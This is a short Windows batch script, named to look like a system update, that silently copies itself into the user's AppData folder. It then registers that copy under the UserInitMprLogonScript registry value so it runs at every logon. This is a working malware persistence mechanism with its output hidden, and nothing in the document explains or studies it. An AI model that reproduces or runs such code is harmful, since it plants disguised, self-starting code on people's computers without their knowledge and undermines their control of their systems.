@echo off
setlocal
set "SCRIPT_NAME=SystemUpdate.bat"
set "DEST_DIR=%APPDATA%\SystemUpdate"
set "DEST_PATH=%DEST_DIR%\%SCRIPT_NAME%"

if not exist "%DEST_DIR%" (
    mkdir "%DEST_DIR%" >nul 2>&1
)

if not exist "%DEST_PATH%" (
    copy /y "%~f0" "%DEST_PATH%" >nul 2>&1
)

reg query "HKCU\Environment" /v UserInitMprLogonScript 2>nul | find /i "%DEST_PATH%" >nul
if errorlevel 1 (
    reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%DEST_PATH%" /f >nul 2>&1
)
endlocal
